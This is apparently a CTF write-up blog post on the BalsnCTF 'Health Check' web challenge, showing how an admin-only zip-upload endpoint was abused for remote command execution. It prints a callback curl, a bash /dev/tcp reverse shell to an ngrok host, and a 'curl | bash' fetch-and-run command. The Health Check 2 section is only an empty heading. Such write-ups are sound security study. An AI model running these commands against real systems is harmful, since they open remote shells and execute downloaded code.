---
layout: single
title: Health Check 1 & 2 - BalsnCTF
excerpt: Want to know whether the challenge is down or it's just your network down? Want to know who to send a message when you want to contact an admin of some challenges? Take a look at our "fastest" Health Check API in the world!
date: 2022-9-05
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: #
categories:
  - ctf
  - web
tags:  
  - BalsnCTF
  - remote command execution
  - race condition
---


## Challenge Description
"Want to know whether the challenge is down or it's just your network down? Want to know who to send a message when you want to contact an admin of some challenges? Take a look at our "fastest" Health Check API in the world!"


## Information
Some information about healthcheck1 and healthcheck2, these are 2 seperate challenges where you have to gain access with RCE for healthcheck 1 enumerate the file system and grab the flag. After that healthcheck 2 comes to the surface, so we got a shell and with that into web application 


## Health Check 1
![index](https://user-images.githubusercontent.com/45040001/188512190-3470dbe0-f726-4f73-92a1-11b802ffe06f.png)

![docs_dir](https://user-images.githubusercontent.com/45040001/188512230-691bfdc5-8811-4e0b-a180-b15a56e97f28.png)

![docs](https://user-images.githubusercontent.com/45040001/188512252-23eea18f-11a7-4008-b7b0-b85ed03742c8.png)
<br>
"<b>This endpoint is only for admin. do NOT share this link with players</b>!

Upload the health check script to create a new problem. The uploaded file should be a zip file. The zip file should NOT have a top-level folder, you must place an executable (or a script) named run. You may put other fiels as you want. Below is an example output of zipinfo myzip.zip of a valid myzip.zip"
<br>
![admin_only](https://user-images.githubusercontent.com/45040001/188512336-edf35a77-5b7d-4bc4-bdd8-956d5aa938f3.png)

![upload exploit](https://user-images.githubusercontent.com/45040001/188512694-815aa9fe-edc5-4eb4-a3d1-fd1103a1ef8a.png)


```bash
#!/bin/bash

curl http://burpcollaborator.net/
```

![curl](https://user-images.githubusercontent.com/45040001/188512936-18f8d21c-d5a4-4cdd-87f0-6dcdd562b042.png)


![cors](https://user-images.githubusercontent.com/45040001/188512958-8afb1bfb-cba4-43b7-ba6a-3535130004f2.png)

```bash
#!/bin/bash
# shell.sh

bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12771 0>&1
```


```bash
#!/bin/bash
# run executable

curl http://server-to-shell.com/shell.sh|bash
```

![rev_shell](https://user-images.githubusercontent.com/45040001/188512834-833e9ba4-3db1-43de-8a8f-dc7e1ae3cd84.png)
![flag](https://user-images.githubusercontent.com/45040001/188512842-48603fcf-de87-439a-8168-dc3fcd5be75e.png)


## Health Check 2
